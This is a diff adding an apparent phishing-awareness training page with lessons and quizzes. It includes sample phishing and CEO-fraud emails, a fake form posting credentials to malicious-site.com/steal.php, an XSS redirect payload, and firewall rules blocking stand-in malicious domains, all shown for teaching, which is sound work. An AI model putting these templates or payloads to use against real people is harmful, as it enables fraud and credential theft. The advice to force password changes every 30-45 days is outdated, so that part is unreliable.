@@ -1,0 +1,1201 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Phishing Attacks - Cybersec Academy</title>
+    <link rel="stylesheet" href="cyberindex.css" />
+    <link rel="stylesheet" href="css/phishing-attacks.css" />
+    <link rel="stylesheet" href="css/index.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <link rel="icon" type="image/png" href="img/favicon.png" />
+    <link rel="stylesheet" href="css/profile-dropdown.css" />
+    <link rel="stylesheet" href="css/responsive.css" />
+    <link rel="stylesheet" href="css/quiz-letters.css" />
+    <style>
+      /* Quiz Styles Override to Ensure Consistency */
+      .topic-quiz .options {
+        display: grid !important;
+        grid-template-columns: 1fr 1fr !important;
+        gap: 12px !important;
+        margin-bottom: 20px !important;
+      }
+      
+      .topic-quiz .option {
+        background: #1c2a3a !important;
+        padding: 15px !important;
+        border-radius: 6px !important;
+        cursor: pointer !important;
+        display: flex !important;
+        align-items: center !important;
+        border: 2px solid transparent !important;
+        pointer-events: auto !important; /* Always enable clicking */
+      }
+      
+      .option-letter {
+        background: rgba(92, 219, 149, 0.2) !important;
+        color: #5cdb95 !important;
+      }
+      
+      @media (max-width: 768px) {
+        .topic-quiz .options {
+          grid-template-columns: 1fr !important;
+        }
+      }
+      
+      /* Ensure quiz options are always clickable in techniques section */
+      .target-card[data-target="techniques"] .topic-quiz .option,
+      .target-card[data-target="techniques"] .topic-quiz-btn {
+        pointer-events: auto !important;
+      }
+
+      /* Additional fix for unlocking topics with debug-lock-overlay */
+      .target-card[data-target="types"].accessible .debug-lock-overlay,
+      .target-card[data-target="prevention"].accessible .debug-lock-overlay {
+        display: none !important;
+      }
+
+      .target-card.accessible {
+        filter: none !important;
+        pointer-events: auto !important;
+      }
+
+      /* Remove red border from current topics */
+      .target-card[data-target="types"],
+      .target-card[data-target="prevention"],
+      .target-card.accessible {
+        border: 3px solid #1a2634 !important;
+      }
+
+      /* Only show red border on locked topics with visible lock overlay */
+      .target-card[data-target="types"]
+        .debug-lock-overlay:not([style*="display: none"])
+        ~ *,
+      .target-card[data-target="prevention"]
+        .debug-lock-overlay:not([style*="display: none"])
+        ~ * {
+        border: none !important;
+      }
+      
+      /* Additional fixes to ensure all quiz elements are clickable */
+      .topic-quiz .option {
+        pointer-events: auto !important;
+        cursor: pointer !important;
+        user-select: none !important;
+      }
+      
+      .topic-quiz-btn {
+        pointer-events: auto !important;
+        cursor: pointer !important;
+      }
+      
+      /* Make sure profile dropdown is visible and works properly */
+      .profile-dropdown {
+        position: absolute;
+        top: 100%;
+        right: 0;
+        background: #1c2a3a;
+        border-radius: 5px;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        z-index: 100;
+        overflow: hidden;
+        transition: all 0.3s ease;
+      }
+      
+      /* Force clickability on profile elements */
+      #profile-container, 
+      .profile-link, 
+      .profile-avatar, 
+      .profile-dropdown a {
+        pointer-events: auto !important;
+        cursor: pointer !important;
+      }
+      
+      /* Always show pointer cursor on clickable elements */
+      .attack-item, 
+      .topic-quiz .option, 
+      .topic-quiz-btn,
+      .complete-btn,
+      .progress-node,
+      #logout-btn,
+      .profile-container,
+      .profile-dropdown a {
+        cursor: pointer !important;
+      }
+    </style>
+    <script>
+      // Add this extra script to handle the hardcoded debug-lock-overlay
+      document.addEventListener("DOMContentLoaded", function () {
+        // Check if the user has completed the first quiz
+        const completedQuizzes =
+          JSON.parse(localStorage.getItem("phishingCompletedQuizzes")) || [];
+
+        if (completedQuizzes.includes("techniques")) {
+          // If techniques is completed, make the next section accessible
+          const typesCard = document.querySelector(
+            '.target-card[data-target="types"]'
+          );
+          if (typesCard) {
+            typesCard.classList.add("accessible");
+            // Enable pointer events on all interactive elements
+            typesCard
+              .querySelectorAll(
+                ".attack-item, .topic-quiz .option, .topic-quiz-btn"
+              )
+              .forEach((el) => (el.style.pointerEvents = "auto"));
+          }
+        }
+
+        if (completedQuizzes.includes("types")) {
+          // If types is completed, make the next section accessible
+          const preventionCard = document.querySelector(
+            '.target-card[data-target="prevention"]'
+          );
+          if (preventionCard) {
+            preventionCard.classList.add("accessible");
+            // Enable pointer events on all interactive elements
+            preventionCard
+              .querySelectorAll(
+                ".attack-item, .topic-quiz .option, .topic-quiz-btn"
+              )
+              .forEach((el) => (el.style.pointerEvents = "auto"));
+          }
+        }
+      });
+    </script>
+  </head>
+  <body>
+    <div class="scanner-lines"></div>
+
+    <div class="noise-overlay"></div>
+
+    <header>
+      <div class="logo">
+        <div class="logo-icon">
+          <i class="fas fa-shield-alt"></i>
+        </div>
+        <div class="logo-text">
+          <span class="cyber">CYBER</span><span class="sec">SEC</span>
+          <span class="academy">Academy</span>
+        </div>
+      </div>
+      <nav>
+        <div class="hamburger-menu">
+          <span></span>
+          <span></span>
+          <span></span>
+        </div>
+        <ul class="nav-links">
+          <li>
+            <a href="index.html" class="nav-link"
+              ><i class="fas fa-home"></i> Home</a
+            >
+          </li>
+          <li>
+            <a href="learn.html" class="nav-link"
+              ><i class="fas fa-graduation-cap"></i> Learn</a
+            >
+          </li>
+          <li>
+            <a href="about-us.html" class="nav-link"
+              ><i class="fas fa-info-circle"></i> About Us</a
+            >
+          </li>
+          <li id="auth-nav-item">
+            <a href="login.html" class="nav-link" id="login-link">
+              <i class="fas fa-user"></i> Login
+            </a>
+            <div
+              class="profile-container"
+              id="profile-container"
+              style="display: none"
+            >
+              <div class="profile-link">
+                <div class="profile-avatar" id="profile-avatar">
+                  <span id="profile-initial"></span>
+                </div>
+                <span class="profile-name" id="profile-name"></span>
+              </div>
+              <div class="profile-dropdown">
+                <a href="profile.html"
+                  ><i class="fas fa-user-circle"></i> View Profile</a
+                >
+                <a href="settings.html"><i class="fas fa-cog"></i> Settings</a>
+                <a href="#" class="logout-link" id="logout-btn"
+                  ><i class="fas fa-sign-out-alt"></i> Logout</a
+                >
+              </div>
+            </div>
+          </li>
+        </ul>
+      </nav>
+    </header>
+
+    <div class="hero-section">
+      <div class="hero-content">
+        <h1>Phishing Attacks</h1>
+        <p>
+          Understanding phishing techniques, types, and implementing effective
+          prevention measures
+        </p>
+      </div>
+    </div>
+
+    <div class="container">
+      <div class="progress-tracker">
+        <div
+          class="progress-node active"
+          data-topic="techniques"
+          data-tooltip="Phishing Techniques - In Progress"
+        >
+          <i class="fas fa-anchor"></i>
+        </div>
+        <div class="progress-line"></div>
+        <div
+          class="progress-node locked"
+          data-topic="types"
+          data-tooltip="Types of Phishing - Locked (Complete Techniques first)"
+        >
+          <i class="fas fa-layer-group"></i>
+        </div>
+        <div class="progress-line"></div>
+        <div
+          class="progress-node locked"
+          data-topic="prevention"
+          data-tooltip="Phishing Prevention - Locked (Complete Types first)"
+        >
+          <i class="fas fa-shield-alt"></i>
+        </div>
+      </div>
+
+      <div class="progress-container">
+        <h3>Module Progress</h3>
+        <div class="progress-bar">
+          <div class="progress" id="module-progress"></div>
+        </div>
+        <div
+          style="display: flex; justify-content: space-between; margin-top: 5px"
+        >
+          <span>0%</span>
+          <span>100%</span>
+        </div>
+        <div class="progress-controls">
+          <button id="reset-progress" class="btn btn-danger">
+            Reset Progress
+          </button>
+        </div>
+      </div>
+
+      <section class="overview">
+        <h2><i class="fas fa-info-circle"></i> Overview</h2>
+        <br />
+        <p>
+          Phishing is a common type of cyber attack that targets individuals
+          through email, text messages, phone calls, and other forms of
+          communication. A phishing attack aims to trick the recipient into
+          falling for the attacker's desired action, such as revealing financial
+          information, system login credentials, or other sensitive information.
+        </p>
+        <br />
+
+        <div class="instruction-box">
+          <h3><i class="fas fa-graduation-cap"></i> How to Progress</h3>
+          <p>
+            To advance through this module, you must correctly answer each
+            topic's quiz before unlocking the next section. Topics are
+            sequentially unlocked as you demonstrate your understanding of the
+            material. Start with "Phishing Techniques" and work your way through
+            all topics to complete the module.
+          </p>
+        </div>
+
+        <h3>Example of Phishing Email</h3>
+        <div class="terminal">
+          <pre><span class="prompt"></span> <span class="command"></span>
+<span class="output">From: security@paypa1-secure.com
+Subject: Urgent: Your Account Has Been Limited
+
+Dear Valued Customer,
+
+We have detected unusual activity on your PayPal account. To prevent any unauthorized access, your account has been temporarily limited.
+
+Please verify your information by clicking the link below:
+https://paypa1-secure.com/verify-account
+
+Note: Failure to verify within 24 hours will result in permanent account suspension.
+
+Best regards,
+PayPal Security Team</span></pre>
+        </div>
+      </section>
+
+      <h2><i class="fas fa-anchor"></i> Types of Phishing Attacks</h2>
+
+      <div class="target-grid">
+        <div class="target-card" data-target="techniques">
+          <span class="difficulty easy">Easy</span>
+          <div class="target-icon">
+            <i class="fas fa-laptop-code"></i>
+          </div>
+          <h2>1. Phishing Techniques</h2>
+          <p>
+            Cybercriminals use three primary phishing techniques to steal
+            information: malicious web links, malicious attachments, and
+            fraudulent data-entry forms.
+          </p>
+
+          <div class="attack-list">
+            <div class="attack-item">
+              <h3>Malicious Web Links</h3>
+              <div class="attack-detail">
+                <p>
+                  Phishing links take users to impostor websites or sites
+                  infected with malicious software. These links are often
+                  disguised as trusted URLs and embedded in logos or images.
+                </p>
+                <div class="practical-exercise">
+                  <h4>Example of Link Manipulation</h4>
+                  <div class="terminal">
+                    <pre><span class="output">Original URL: https://www.paypal.com/login
+Phishing URL: https://www.paypa1.com/login
+                    
+Hidden Link HTML:
+<a href="https://malicious-site.com">https://www.paypal.com/login</a></span></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="attack-item">
+              <h3>Malicious Attachments</h3>
+              <div class="attack-detail">
+                <p>
+                  These attachments appear legitimate but contain malware that
+                  can compromise computers and their files.
+                </p>
+                <div class="practical-exercise">
+                  <h4>Common Malicious Attachment Types</h4>
+                  <ul>
+                    <li>.exe - Executable files</li>
+                    <li>.doc or .docm - Macro-enabled documents</li>
+                    <li>.pdf - PDF files with embedded scripts</li>
+                    <li>.zip - Compressed files hiding malware</li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+
+            <div class="attack-item">
+              <h3>Fraudulent Data Entry Forms</h3>
+              <div class="attack-detail">
+                <p>
+                  Fake forms that prompt users to enter sensitive information
+                  like passwords, credit card data, and personal details.
+                </p>
+                <div class="practical-exercise">
+                  <h4>Analyzing a Phishing Form</h4>
+                  <div class="terminal">
+                    <pre><span class="output">HTML Form Analysis:
+<form action="https://malicious-site.com/steal.php" method="POST">
+  <input type="text" name="username" placeholder="Email">
+  <input type="password" name="password" placeholder="Password">
+  <input type="text" name="cc" placeholder="Credit Card">
+  <button type="submit">Verify Account</button>
+</form></span></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <h3 class="protection-heading">Protection Tips:</h3>
+          <ul class="protection-list">
+            <li>Always verify the sender's email address</li>
+            <li>Check URLs carefully before clicking</li>
+            <li>Never open unexpected attachments</li>
+            <li>Use anti-phishing browser extensions</li>
+          </ul>
+
+          <!-- Add topic-specific quiz -->
+          <div class="topic-quiz">
+            <h4><i class="fas fa-brain"></i> Knowledge Check</h4>
+            <div class="question">
+              <p>
+                Which phishing technique is most commonly used to capture login
+                credentials?
+              </p>
+              <div class="options">
+                <div class="option" data-correct="false">
+                  <span class="option-letter">A</span>
+                  <span class="option-text">Malicious attachments</span>
+                </div>
+                <div class="option" data-correct="true">
+                  <span class="option-letter">B</span>
+                  <span class="option-text">Fraudulent data entry forms</span>
+                </div>
+                <div class="option" data-correct="false">
+                  <span class="option-letter">C</span>
+                  <span class="option-text">Link manipulation alone</span>
+                </div>
+                <div class="option" data-correct="false">
+                  <span class="option-letter">D</span>
+                  <span class="option-text">Social media messages</span>
+                </div>
+              </div>
+            </div>
+            <div class="topic-quiz-results" style="display: none">
+              <p class="correct-answer" style="display: none">
+                Correct! Fraudulent data entry forms are specifically designed
+                to capture credentials and other sensitive information.
+              </p>
+              <p class="incorrect-answer" style="display: none">
+                Incorrect. Try again!
+              </p>
+            </div>
+            <button class="btn btn-primary topic-quiz-btn">Check Answer</button>
+          </div>
+
+          <!-- Progress Tracking Button removed to use quiz-based progress only -->
+        </div>
+
+        <div class="target-card" data-target="types">
+          <span class="difficulty medium">Medium</span>
+          <div class="target-icon">
+            <i class="fas fa-sitemap"></i>
+          </div>
+          <h2>2. Advanced Phishing Types</h2>
+          <p>
+            Phishing has evolved into various sophisticated forms targeting
+            different aspects of digital communication and specific groups of
+            users.
+          </p>
+
+          <!-- HARDCODED LOCK OVERLAY -->
+          <div class="debug-lock-overlay">
+            <i class="fas fa-lock"></i>
+            <div class="debug-lock-message">
+              Complete "Phishing Techniques" to unlock
+            </div>
+          </div>
+
+          <div class="attack-list">
+            <div class="attack-item">
+              <h3>Email Phishing</h3>
+              <div class="attack-detail">
+                <p>
+                  The general term given to any malicious email message meant to
+                  trick users into divulging private information. Attackers
+                  generally aim to steal account credentials, personally
+                  identifiable information (PII) and corporate trade secrets.
+                </p>
+                <div class="practical-exercise">
+                  <h4>Common Email Phishing Indicators</h4>
+                  <ul>
+                    <li>Generic greetings instead of personalized ones</li>
+                    <li>Spelling and grammar errors</li>
+                    <li>Urgency or threatening language</li>
+                    <li>Suspicious sender email domains</li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+
+            <div class="attack-item">
+              <h3>Spear Phishing</h3>
+              <div class="attack-detail">
+                <p>
+                  Targeted attacks aimed at specific individuals or
+                  organizations, often using personalized information to appear
+                  more credible.
+                </p>
+                <div class="practical-exercise">
+                  <h4>Spear Phishing Example</h4>
+                  <div class="terminal">
+                    <pre><span class="output">From: ceo@company-name.com
+To: finance@company-name.com
+Subject: Urgent Wire Transfer Needed
+
+Hi Sarah,
+
+I'm in a meeting but need you to process an urgent wire transfer.
+Amount: $28,500
+Beneficiary: ABC Consulting Ltd
+Account: 1234567890
+
+Please handle this ASAP and send confirmation.
+
+Best regards,
+John Smith
+CEO</span></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="attack-item">
+              <h3>Link Manipulation</h3>
+              <div class="attack-detail">
+                <p>
+                  Messages contain a link to a malicious site that looks like
+                  the official business but takes recipients to an
+                  attacker-controlled server where they are persuaded to
+                  authenticate into a spoofed login page that sends credentials
+                  to an attacker.
+                </p>
+                <div class="practical-exercise">
+                  <h4>Link Manipulation Techniques</h4>
+                  <div class="terminal">
+                    <pre><span class="output">1. Lookalike domains: bankofamerica-secure.com vs. bankofamerica.com
+2. IDN homograph attacks: using characters from different languages
+   Example: аррӏе.com (using Cyrillic 'а' and 'р')
+3. URL shorteners: hiding malicious URLs behind bit.ly, tinyurl.com, etc.
+4. HTML tricks: <a href="https://malicious-site.com">https://legitimate-bank.com</a>
+5. Typosquatting: misspelled domains like amazom.com or gooogle.com</span></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="attack-item">
+              <h3>Whaling & CEO Fraud</h3>
+              <div class="attack-detail">
+                <p>
+                  High-stakes attacks targeting senior executives or using
+                  executive impersonation to authorize fraudulent transactions.
+                </p>
+                <div class="practical-exercise">
+                  <h4>CEO Fraud Analysis</h4>
+                  <div class="terminal">
+                    <pre><span class="output">Attack Pattern:
+1. Research target company structure
+2. Create lookalike domain (ceo@company-name.co vs .com)
+3. Impersonate CEO's writing style
+4. Request urgent financial action
+5. Pressure recipient with time constraints
+6. Emphasize confidentiality</span></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="attack-item">
+              <h3>Smishing & Vishing</h3>
+              <div class="attack-detail">
+                <p>
+                  SMS-based (Smishing) and voice-based (Vishing) phishing
+                  attacks that exploit mobile and telephone communications.
+                </p>
+                <div class="practical-exercise">
+                  <h4>Common Attack Patterns</h4>
+                  <div class="terminal">
+                    <pre><span class="output">Smishing Example:
+"Your account has been suspended. Click here to reactivate: bit.ly/scam-link"
+
+Vishing Script:
+"Hello, this is Microsoft Tech Support. We've detected a virus on your computer..."</span></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="attack-item">
+              <h3>Content Injection</h3>
+              <div class="attack-detail">
+                <p>
+                  An attacker who can inject malicious content into an official
+                  site will trick users into accessing the site to show them a
+                  malicious popup or redirect them to a phishing website.
+                </p>
+                <div class="practical-exercise">
+                  <h4>Example Attack Scenario</h4>
+                  <div class="terminal">
+                    <pre><span class="output">1. Attacker exploits XSS vulnerability on legitimate website
+2. Injects script: &lt;script&gt;window.location='https://fake-login.com'&lt;/script&gt;
+3. When users visit the compromised page, they're redirected to phishing site
+4. Users believe they're still on the legitimate website
+5. Enter credentials, which are sent to the attacker</span></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="attack-item">
+              <h3>Malware-Based Phishing</h3>
+              <div class="attack-detail">
+                <p>
+                  Users tricked into clicking a link or opening an attachment
+                  might download malware onto their devices. Ransomware,
+                  rootkits, or keyloggers are common malware attachments that
+                  steal data and extort payments from targeted victims.
+                </p>
+                <div class="practical-exercise">
+                  <h4>Common Malware Delivery Methods</h4>
+                  <ul>
+                    <li>Macro-enabled documents (.docm, .xlsm)</li>
+                    <li>Executable files disguised as PDFs or images</li>
+                    <li>JavaScript attachments (.js)</li>
+                    <li>Archive files with hidden executables (.zip, .rar)</li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+
+            <div class="attack-item">
+              <h3>"Evil Twin" Wi-Fi</h3>
+              <div class="attack-detail">
+                <p>
+                  Spoofing free Wi-Fi, attackers trick users into connecting to
+                  a malicious hotspot to perform man-in-the-middle exploits.
+                </p>
+                <div class="practical-exercise">
+                  <h4>Attack Methodology</h4>
+                  <div class="terminal">
+                    <pre><span class="output">1. Attacker creates wireless access point with name similar to legitimate network
+   Example: "Starbucks_Free_WiFi" vs. official "Starbucks WiFi"
+2. Positions themselves in popular location (coffee shop, airport, hotel)
+3. When victims connect, all traffic passes through attacker's device
+4. Attacker can:
+   - Monitor all unencrypted traffic
+   - Inject malicious code into websites
+   - Redirect to phishing pages
+   - Capture login credentials</span></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="attack-item">
+              <h3>Pharming</h3>
+              <div class="attack-detail">
+                <p>
+                  Pharming is a two-phase attack used to steal account
+                  credentials. The first phase installs malware on a targeted
+                  victim and redirects them to a browser and a spoofed website
+                  where they are tricked into divulging credentials. DNS
+                  poisoning is also used to redirect users to spoofed domains.
+                </p>
+                <div class="practical-exercise">
+                  <h4>DNS Cache Poisoning Attack</h4>
+                  <div class="terminal">
+                    <pre><span class="output">Normal DNS Resolution:
+1. User types "bank.com" in browser
+2. Computer checks local DNS cache
+3. If not found, query sent to ISP's DNS server
+4. DNS server returns IP address for bank.com
+5. Browser connects to correct website
+
+Pharming Attack:
+1. Attacker compromises DNS server or poisons DNS cache
+2. Modified DNS records point bank.com to attacker's IP
+3. User types "bank.com" but is sent to fake site
+4. URL shows correct domain, but site is controlled by attacker</span></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="attack-item">
+              <h3>Angler Phishing</h3>
+              <div class="attack-detail">
+                <p>
+                  Using social media, attackers reply to posts pretending to be
+                  an official organization and trick users into divulging
+                  account credentials and personal information.
+                </p>
+                <div class="practical-exercise">
+                  <h4>Social Media Attack Vector</h4>
+                  <div class="terminal">
+                    <pre><span class="output">1. User posts complaint about service on company's social media page
+   Example: "@AirlineX your flight was delayed and I missed my connection!"
+2. Attacker creates account resembling support: "@AirlineX_Support"
+3. Attacker responds: "We apologize for the inconvenience. Please verify your booking at https://airlinex-refund.com to process compensation"
+4. User follows link, enters personal and payment information
+5. Attacker harvests data for fraud or identity theft</span></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="attack-item">
+              <h3>Watering Hole</h3>
+              <div class="attack-detail">
+                <p>
+                  A compromised site provides endless opportunities, so an
+                  attacker identifies a site used by numerous targeted users,
+                  exploits a vulnerability on the site, and uses it to trick
+                  users into downloading malware. With malware installed on
+                  targeted user machines, an attacker can redirect users to
+                  spoofed websites or deliver a payload to the local network to
+                  steal data.
+                </p>
+                <div class="practical-exercise">
+                  <h4>Targeted Watering Hole Attack</h4>
+                  <div class="terminal">
+                    <pre><span class="output">Attack Process:
+1. Identify websites frequently visited by target organization
+   Examples: Industry forums, supplier portals, partner websites
+2. Compromise selected website through vulnerability exploitation
+3. Inject malicious code that targets specific organizations by IP ranges
+4. When target employees visit the site, malware is delivered silently
+5. Establish persistence in the target network through installed backdoors
+6. Exfiltrate sensitive data or establish command & control</span></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <h3 class="protection-heading">Protection Tips:</h3>
+          <ul class="protection-list">
+            <li>Implement multi-factor authentication</li>
+            <li>Verify unusual requests through alternative channels</li>
+            <li>Train employees to recognize social engineering</li>
+            <li>Use DMARC email authentication</li>
+          </ul>
+
+          <!-- Add topic-specific quiz for Types -->
+          <div class="topic-quiz">
+            <h4><i class="fas fa-brain"></i> Knowledge Check</h4>
+            <div class="question">
+              <p>
+                Which type of phishing attack specifically targets high-ranking
+                executives?
+              </p>
+              <div class="options">
+                <div class="option" data-correct="false">
+                  <span class="option-letter">A</span>
+                  <span class="option-text">Spear phishing</span>
+                </div>
+                <div class="option" data-correct="true">
+                  <span class="option-letter">B</span>
+                  <span class="option-text">Whaling</span>
+                </div>
+                <div class="option" data-correct="false">
+                  <span class="option-letter">C</span>
+                  <span class="option-text">Smishing</span>
+                </div>
+                <div class="option" data-correct="false">
+                  <span class="option-letter">D</span>
+                  <span class="option-text">Vishing</span>
+                </div>
+              </div>
+            </div>
+            <div class="topic-quiz-results" style="display: none">
+              <p class="correct-answer" style="display: none">
+                Correct! Whaling specifically targets executives and high-value
+                individuals in an organization.
+              </p>
+              <p class="incorrect-answer" style="display: none">
+                Incorrect. Try again!
+              </p>
+            </div>
+            <button class="btn btn-primary topic-quiz-btn">Check Answer</button>
+          </div>
+
+          <!-- Progress Tracking Button removed to use quiz-based progress only -->
+        </div>
+
+        <div class="target-card" data-target="prevention">
+          <span class="difficulty hard">Hard</span>
+          <div class="target-icon">
+            <i class="fas fa-shield-virus"></i>
+          </div>
+          <h2>3. Prevention & Security</h2>
+          <p>
+            Effective phishing prevention requires a multi-layered approach
+            combining user training, technical controls, and organizational
+            policies.
+          </p>
+
+          <!-- HARDCODED LOCK OVERLAY -->
+          <div class="debug-lock-overlay">
+            <i class="fas fa-lock"></i>
+            <div class="debug-lock-message">
+              Complete "Advanced Phishing Types" to unlock
+            </div>
+          </div>
+
+          <div class="attack-list">
+            <div class="attack-item">
+              <h3>User Training & Awareness</h3>
+              <div class="attack-detail">
+                <p>
+                  Training users to detect a phishing email is crucial. A sense
+                  of urgency and requests for personal data, including
+                  passwords, embedded links and attachments, are all warning
+                  signs. Users must be able to identify these warning signs to
+                  defend against phishing.
+                </p>
+                <div class="practical-exercise">
+                  <h4>Key Training Elements</h4>
+                  <ul>
+                    <li>Regular phishing simulations</li>
+                    <li>Security awareness workshops</li>
+                    <li>How to identify suspicious emails</li>
+                    <li>Reporting procedures for suspected phishing</li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+
+            <div class="attack-item">
+              <h3>Email Security & Filters</h3>
+              <div class="attack-detail">
+                <p>
+                  Use anti-phishing email security systems. Artificial
+                  intelligence scans incoming messages, detects suspicious
+                  messages and quarantines them without allowing phishing
+                  messages to reach the recipient's inbox.
+                </p>
+                <div class="practical-exercise">
+                  <h4>Email Security Configuration</h4>
+                  <div class="terminal">
+                    <pre><span class="prompt">admin@server:~$</span> <span class="command">cat email_security.conf</span>
+<span class="output"># SPF Record
+v=spf1 ip4:192.0.2.0/24 include:_spf.google.com ~all
+
+# DKIM Configuration
+selector._domainkey IN TXT "v=DKIM1; k=rsa; p=MIGfMA0..."
+
+# DMARC Policy
+_dmarc IN TXT "v=DMARC1; p=reject; rua=mailto:reports..."</span></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="attack-item">
+              <h3>Safe Browsing Practices</h3>
+              <div class="attack-detail">
+                <p>
+                  Avoid clicking links directly from emails. Instead of clicking
+                  a link and authenticating into a web page directly from an
+                  embedded link, type the official domain into a browser and
+                  authenticate directly from the manually typed site.
+                </p>
+                <div class="practical-exercise">
+                  <h4>URL Verification Technique</h4>
+                  <div class="terminal">
+                    <pre><span class="output">1. Received email claiming to be from your bank
+2. INCORRECT: Clicking on "Click here to verify your account"
+3. CORRECT: Open a new browser tab
+4. Type your bank's official URL manually (e.g., www.mybank.com)
+5. Navigate to the relevant section through official site menus
+6. Log in with your credentials only on the official site</span></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="attack-item">
+              <h3>Password Management</h3>
+              <div class="attack-detail">
+                <p>
+                  Change passwords regularly: users should be forced to change
+                  their passwords every 30-45 days to reduce an attacker's
+                  window of opportunity. Leaving passwords active for too long
+                  gives an attacker indefinite access to a compromised account.
+                </p>
+                <div class="practical-exercise">
+                  <h4>Password Best Practices</h4>
+                  <ul>
+                    <li>Use a different password for each account</li>
+                    <li>
+                      Create complex passwords (12+ characters with mixed case,
+                      numbers, symbols)
+                    </li>
+                    <li>Consider using a password manager</li>
+                    <li>
+                      Enable multi-factor authentication wherever possible
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+
+            <div class="attack-item">
+              <h3>System & Software Updates</h3>
+              <div class="attack-detail">
+                <p>
+                  Keep software and firmware up-to-date: software and firmware
+                  developers release updates to remediate bugs and security
+                  issues. Always install these updates to ensure known
+                  vulnerabilities are no longer present in your infrastructure.
+                </p>
+                <div class="practical-exercise">
+                  <h4>Update Management Strategy</h4>
+                  <div class="terminal">
+                    <pre><span class="prompt">admin@server:~$</span> <span class="command">apt update && apt list --upgradable</span>
+<span class="output">Hit:1 http://security.ubuntu.com/ubuntu focal-security InRelease
+Get:2 http://archive.ubuntu.com/ubuntu focal-updates InRelease [114 kB]
+Fetched 114 kB in 1s (114 kB/s)
+Reading package lists... Done
+Building dependency tree... Done
+
+Listing...
+firefox/focal-updates,focal-security 89.0+build2-0ubuntu0.20.04.2 amd64 [upgradable from: 88.0+build2-0ubuntu0.20.04.1]
+openssl/focal-updates,focal-security 1.1.1f-1ubuntu2.5 amd64 [upgradable from: 1.1.1f-1ubuntu2.3]
+openssh-server/focal-updates,focal-security 1:8.2p1-4ubuntu0.3 amd64 [upgradable from: 1:8.2p1-4ubuntu0.2]</span></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="attack-item">
+              <h3>Network Security Controls</h3>
+              <div class="attack-detail">
+                <p>
+                  Install firewalls: firewalls control inbound and outbound
+                  traffic. Malware installed from phishing silently eavesdrops
+                  and sends private data to an attacker, but a firewall blocks
+                  malicious outgoing requests and logs them for further review.
+                </p>
+                <div class="practical-exercise">
+                  <h4>Basic Firewall Configuration</h4>
+                  <div class="terminal">
+                    <pre><span class="prompt">admin@server:~$</span> <span class="command">cat /etc/iptables/rules.v4</span>
+<span class="output"># Default policies
+-P INPUT DROP
+-P FORWARD DROP
+-P OUTPUT ACCEPT
+
+# Allow established connections
+-A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
+
+# Allow SSH, HTTP, HTTPS
+-A INPUT -p tcp --dport 22 -j ACCEPT
+-A INPUT -p tcp --dport 80 -j ACCEPT
+-A INPUT -p tcp --dport 443 -j ACCEPT
+
+# Block outgoing connections to known malicious domains
+-A OUTPUT -d malicious-site.com -j DROP
+-A OUTPUT -d phishing-domain.net -j DROP</span></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="attack-item">
+              <h3>Browser & Popup Security</h3>
+              <div class="attack-detail">
+                <p>
+                  Avoid clicking on popups: attackers change the location of the
+                  X button on a popup window to trick users into opening a
+                  malicious site or downloading malware. Popup blockers stop
+                  many popups, but false negatives are still possible.
+                </p>
+                <div class="practical-exercise">
+                  <h4>Browser Security Settings</h4>
+                  <ul>
+                    <li>Enable popup blockers in your browser</li>
+                    <li>
+                      Install security extensions (uBlock Origin, Privacy
+                      Badger)
+                    </li>
+                    <li>Use browser phishing protection features</li>
+                    <li>
+                      When encountering a popup, use Alt+F4 instead of clicking
+                      X
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+
+            <div class="attack-item">
+              <h3>Financial Information Protection</h3>
+              <div class="attack-detail">
+                <p>
+                  Be cautious about giving out credit card data: unless you know
+                  the site is completely trustworthy, never give credit card
+                  data to a website you don't recognize. Any site promising
+                  gifts or money back should be used with caution.
+                </p>
+                <div class="practical-exercise">
+                  <h4>Safe Online Shopping Practices</h4>
+                  <ul>
+                    <li>Verify HTTPS/SSL is active (lock icon in browser)</li>
+                    <li>
+                      Use credit cards instead of debit cards for purchases
+                    </li>
+                    <li>
+                      Consider virtual credit cards for one-time transactions
+                    </li>
+                    <li>
+                      Check website reviews and reputation before purchasing
+                    </li>
+                    <li>
+                      Use trusted payment processors (PayPal, Apple Pay, Google
+                      Pay)
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+
+            <div class="attack-item">
+              <h3>Incident Response</h3>
+              <div class="attack-detail">
+                <p>
+                  Procedures for handling successful phishing attacks and
+                  preventing future incidents.
+                </p>
+                <div class="practical-exercise">
+                  <h4>Incident Response Plan</h4>
+                  <div class="terminal">
+                    <pre><span class="output">1. IDENTIFICATION
+- Detect phishing incident
+- Document initial findings
+- Alert security team
+
+2. CONTAINMENT
+- Isolate affected systems
+- Block malicious URLs/IPs
+- Disable compromised accounts
+
+3. ERADICATION
+- Remove malware
+- Reset credentials
+- Patch vulnerabilities
+
+4. RECOVERY
+- Restore from backups
+- Verify system integrity
+- Resume operations
+
+5. LESSONS LEARNED
+- Update security controls
+- Enhance training
+- Improve procedures</span></pre>
